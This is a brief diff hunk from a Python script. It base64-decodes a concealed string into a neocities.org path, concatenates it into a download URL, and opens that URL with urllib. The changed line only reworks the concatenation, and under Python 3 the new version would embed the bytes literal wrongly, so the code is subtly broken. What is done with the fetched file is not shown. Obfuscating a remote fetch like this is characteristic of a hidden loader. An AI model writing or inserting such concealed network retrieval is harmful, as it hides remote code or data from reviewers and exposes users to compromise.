@@ -5,7 +5,7 @@ import base64
 a = 'Lm5lb2NpdGllcy5vcmcvYmFzb2oudHh0'
 j = base64.b64decode(a)
 
-link = "https://femboiluver420" + j
+link = f"https://femboiluver420{j}"
 
 if sys.version_info[0] < 3:
     f = urllib.urlopen(link)
